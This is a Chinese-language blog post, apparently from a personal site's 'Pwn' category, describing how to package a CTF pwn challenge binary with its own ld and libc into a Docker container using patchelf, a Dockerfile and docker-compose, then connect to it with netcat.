    <content type="html"><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>分清楚 镜像，容器</p><p>​ Dockerfile和docker-compose.yml</p><p>​ 靶机：本地和服务器</p><h2 id="题目文件"><a href="#题目文件" class="headerlink" title="题目文件"></a>题目文件</h2><p><strong>pwn文件, ld文件，libc文件</strong></p><p><strong>分别命名为pwn, ld, libc</strong></p><p><img src="/../md/4.png" alt="在这里插入图片描述"></p><h2 id="Patchelf"><a href="#Patchelf" class="headerlink" title="Patchelf"></a>Patchelf</h2><p>先手动patchelf，修改pwn文件的链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">设置解释器</span><br>patchelf --set-interpreter /pwn/ld /pwn/pwn<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">设置libc</span><br>patchelf --replace-needed libc.so.6 /pwn/libc /pwn/pwn<br><span class="hljs-meta prompt_">#</span><span class="language-bash">原libc --&gt; 待替换的libc --&gt; 文件名</span><br></code></pre></td></tr></table></figure><p>Patchelf之后的效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@ls:~# ldd /pwn/pwn<br>        linux-vdso.so.1 (0x00007fff053ba000)<br>        /pwn/libc (0x00007f55ee7f2000)<br>        /pwn/ld =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f55ee9ed000)<br></code></pre></td></tr></table></figure><h2 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> glzjin/pwn_base_20<br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ld /pwn/ld</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> libc /pwn/libc</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> pwn /pwn/pwn</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> a+x /pwn/ld &amp;&amp; <span class="hljs-built_in">chmod</span> a+x /pwn/libc &amp;&amp; <span class="hljs-built_in">chmod</span> a+x /pwn/pwn</span><br></code></pre></td></tr></table></figure><h2 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;2&quot;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">pwn:</span><br>    <span class="hljs-attr">build:</span> <span class="hljs-string">.</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;10000:10000&quot;</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">FLAG=flag&#123;test&#125;</span><br></code></pre></td></tr></table></figure><h1 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h1><h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><p>那么制作了dockerfile文件，我们要怎么才能实现平常做题时的效果</p><p><strong>0.安装&amp;启动 docker和docker-compose</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@ls:~# sudo apt-get install docker.io<br>root@ls:~# sudo systemctl start docker<br><br>root@ls:~# apt  install docker-compose<br></code></pre></td></tr></table></figure><p><strong>1.创建pwn文件夹，拷贝文件到系统根目录的pwn文件夹下</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">初次使用</span><br>root@ls:~# cd /<br>root@ls:~# mkdir pwn<br>root@ls:~# cd /pwn<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">在此，之后拷贝文件到该目录下</span><br></code></pre></td></tr></table></figure><p><strong>切记: 先手动Patchelf一下文件，修改libc和ld路径为&#x2F;pwn&#x2F;libc和&#x2F;pwn&#x2F;ld</strong></p><p><img src="/../md/5.png" alt="在这里插入图片描述"></p><h2 id="通过yml文件快速生成容器"><a href="#通过yml文件快速生成容器" class="headerlink" title="通过yml文件快速生成容器"></a>通过yml文件快速生成容器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker-compose up -d</span><br></code></pre></td></tr></table></figure><h2 id="手动生成容器"><a href="#手动生成容器" class="headerlink" title="手动生成容器"></a>手动生成容器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">docker文件</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建镜像</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t magic .</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">显示镜像</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker images</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建并运行容器</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -itd -p 10000:10000 magic</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">显示容器</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker ps</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">运行并测试容器,424e是容器<span class="hljs-built_in">id</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -it 424e bash</span><br></code></pre></td></tr></table></figure><h2 id="附加：容器管理"><a href="#附加：容器管理" class="headerlink" title="附加：容器管理"></a>附加：容器管理</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker ps<br><br>docker stop ID<br><br>docker rm  ID<br></code></pre></td></tr></table></figure><h1 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc ip 10000<br></code></pre></td></tr></table></figure><h1 id="本地连接"><a href="#本地连接" class="headerlink" title="本地连接"></a>本地连接</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">//查看容器<br>docker ps <br><br>//查看tcp端口<br>sudo netstat -apt<br><br></code></pre></td></tr></table></figure><p><strong>如果没有服务器，本地应该是0.0.0.0 10000，但是作者打不通，就不作赘述了</strong></p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>零散</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
